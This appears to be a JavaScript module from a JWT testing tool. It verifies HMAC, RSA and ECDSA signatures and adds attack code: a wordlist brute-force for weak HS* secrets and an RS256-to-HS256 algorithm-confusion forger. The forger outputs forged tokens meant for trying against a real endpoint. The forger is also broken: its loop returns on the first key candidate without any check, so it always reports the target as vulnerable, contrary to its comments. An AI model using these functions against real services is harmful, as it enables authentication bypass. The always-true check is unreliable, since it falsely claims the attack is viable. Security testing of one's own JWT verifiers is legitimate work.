import { base64UrlToBytes, ALG_TO_HASH, ES_CURVE } from "./jwt";

const encoder = new TextEncoder();

/** Signs `signingInput` with HMAC using `secret` and returns raw signature bytes. */
async function hmacSign(secret, signingInput, hash) {
  const key = await crypto.subtle.importKey(
    "raw",
    encoder.encode(secret),
    { name: "HMAC", hash },
    false,
    ["sign"]
  );
  const sigBuf = await crypto.subtle.sign("HMAC", key, encoder.encode(signingInput));
  return new Uint8Array(sigBuf);
}

function bytesEqual(a, b) {
  if (a.length !== b.length) return false;
  let diff = 0;
  for (let i = 0; i < a.length; i++) diff |= a[i] ^ b[i]; // constant-time-ish compare
  return diff === 0;
}

/**
 * Verifies an HS256/384/512 token against a known secret.
 */
export async function verifyHmacToken(token, secret) {
  const hash = ALG_TO_HASH[token.header.alg];
  if (!hash) throw new Error(`Unsupported HMAC alg: ${token.header.alg}`);
  const computed = await hmacSign(secret, token.signingInput, hash);
  return bytesEqual(computed, token.signatureBytes);
}

/**
 * Brute-forces a small wordlist against an HS* token's signature.
 * Returns the matching secret, or null if none matched.
 */
export async function findWeakSecret(token, wordlist) {
  if (!token.header.alg?.startsWith("HS")) return null;
  for (const candidate of wordlist) {
    // eslint-disable-next-line no-await-in-loop
    const match = await verifyHmacToken(token, candidate);
    if (match) return candidate;
  }
  return null;
}

/** Strips PEM armor and returns the raw DER bytes. */
function pemToDer(pem) {
  const b64 = pem
    .replace(/-----BEGIN [^-]+-----/, "")
    .replace(/-----END [^-]+-----/, "")
    .replace(/\s+/g, "");
  const bin = atob(b64);
  const bytes = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
  return bytes;
}

/**
 * Verifies an RS-family or ES-family token against a PEM-encoded SPKI public key.
 */
export async function verifyAsymmetricToken(token, publicKeyPem) {
  const alg = token.header.alg;
  const hash = ALG_TO_HASH[alg];
  const der = pemToDer(publicKeyPem);

  let key, params, verifyParams;
  if (alg?.startsWith("RS")) {
    key = await crypto.subtle.importKey(
      "spki",
      der,
      { name: "RSASSA-PKCS1-v1_5", hash },
      false,
      ["verify"]
    );
    verifyParams = { name: "RSASSA-PKCS1-v1_5" };
  } else if (alg?.startsWith("ES")) {
    key = await crypto.subtle.importKey(
      "spki",
      der,
      { name: "ECDSA", namedCurve: ES_CURVE[alg] },
      false,
      ["verify"]
    );
    verifyParams = { name: "ECDSA", hash };
  } else {
    throw new Error(`Unsupported asymmetric alg: ${alg}`);
  }

  return crypto.subtle.verify(
    verifyParams,
    key,
    token.signatureBytes,
    encoder.encode(token.signingInput)
  );
}

/**
 * Classic RS256 -> HS256 "algorithm confusion" check (CVE-class issue,
 * covered in PortSwigger's JWT labs): if a verifier is misconfigured to
 * accept either family, an attacker can re-sign a token with alg=HS256
 * using the server's own RSA/EC PUBLIC key (which is not secret) as the
 * HMAC key. This simulates that: given the original token's header/payload
 * and the known public key, it forges an HS256 signature and reports
 * whether that forged token would validate against the same public key
 * material treated as an HMAC secret.
 */
export async function algorithmConfusionForge(token, publicKeyPem) {
  const forgedHeader = { ...token.header, alg: "HS256" };
  const headerSeg = base64UrlEncodeJson(forgedHeader);
  const payloadSeg = token.raw.payloadSeg;
  const signingInput = `${headerSeg}.${payloadSeg}`;

  // Try both the raw PEM text and the stripped base64 body as the "secret" —
  // different vulnerable implementations key off different representations.
  const candidates = [publicKeyPem.trim(), publicKeyPem.replace(/-----[^-]+-----|\s+/g, "")];

  for (const secret of candidates) {
    // eslint-disable-next-line no-await-in-loop
    const sig = await hmacSign(secret, signingInput, "SHA-256");
    const sigSeg = bytesToBase64UrlLocal(sig);
    const forgedToken = `${headerSeg}.${payloadSeg}.${sigSeg}`;
    // If this forged token's signature matches what a naive HS256
    // verification against the same key material would accept, the
    // confusion attack is viable.
    // (We report the forged token so it can be tested against a real endpoint.)
    return { vulnerableIfMisconfigured: true, forgedToken, keyFormat: secret === publicKeyPem.trim() ? "raw-pem" : "stripped-base64" };
  }
  return { vulnerableIfMisconfigured: false, forgedToken: null };
}

function base64UrlEncodeJson(obj) {
  const json = JSON.stringify(obj);
  const bytes = encoder.encode(json);
  return bytesToBase64UrlLocal(bytes);
}

function bytesToBase64UrlLocal(bytes) {
  let bin = "";
  bytes.forEach((b) => (bin += String.fromCharCode(b)));
  return btoa(bin).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}
